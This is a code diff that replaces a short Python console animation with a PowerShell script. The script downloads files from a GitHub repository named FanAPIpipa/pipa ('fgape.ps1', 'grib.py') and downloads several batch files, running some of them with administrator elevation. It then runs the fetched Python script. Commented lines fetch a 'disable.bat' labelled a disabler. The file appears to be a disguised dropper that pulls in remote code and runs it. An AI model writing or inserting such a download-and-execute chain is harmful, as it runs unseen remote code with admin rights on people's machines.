@@ -1,15 +1,30 @@
-import os 
-import sys
-
-def console_frame(output):
-	os.system('clear' if os.name == 'posix' else 'CLS')
-	sys.stdout.write(output + "\n")
-	sys.stdout.flush()
-
-
-import time
-import math
-
-for t in range(100):
-	console_frame("\n".join(["*" * (30 + int(30 * math.sin(.1 * x + .1 * t))) for x in range(30)])) # time-varying sine wave
-	time.sleep(.04)
+$tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
+$fgapeScriptUrl = "https://github.com/FanAPIpipa/pipa/raw/main/fgape.ps1"
+$fgapeScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "fgape.ps1"
+Invoke-WebRequest -Uri $fgapeScriptUrl -OutFile $fgapeScriptPath
+if (Test-Path $fgapeScriptPath) {
+    $tempFolder = New-Item -ItemType Directory -Path "$env:TEMP\ProvisionWindows" -Force
+    $installPythonBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
+    $installPythonBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
+    #$batFileDisabler = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/disable.bat"
+    #$batFileDisablerPath = Join-Path -Path $tempFolder.FullName -ChildPath "disable.bat"
+    $installPythonToolsBatUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python-tools.bat"
+    $installPythonToolsBatPath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python-tools.bat"
+    $batFileUrl = "https://raw.githubusercontent.com/nuket/provision-windows/master/install-python.bat"
+    $batFilePath = Join-Path -Path $tempFolder.FullName -ChildPath "install-python.bat"
+    Invoke-WebRequest -Uri $installPythonBatUrl -OutFile $installPythonBatPath
+    #Invoke-WebRequest -Uri $batFileDisabler -OutFile $batFileDisablerPath
+    #[System.Windows.Forms.MessageBox]::Show("Disable bat downloaded")
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonBatPath" -Verb RunAs -Wait
+    Invoke-WebRequest -Uri $installPythonToolsBatUrl -OutFile $installPythonToolsBatPath
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $installPythonToolsBatPath" -Wait
+    Invoke-WebRequest -Uri $batFileUrl -OutFile $batFilePath
+    Start-Process -FilePath "cmd.exe" -ArgumentList "/c $batFilePath" -Verb RunAs -Wait
+    $gribScriptUrl = "https://raw.githubusercontent.com/FanAPIpipa/pipa/main/grib.py"
+    $gribScriptPath = Join-Path -Path $tempFolder.FullName -ChildPath "grib.py"
+    Invoke-WebRequest -Uri $gribScriptUrl -OutFile $gribScriptPath
+    python $gribScriptPath
+} else {
+    Write-Host "Не удалось загрузить скрипт fgape.ps1."
+}
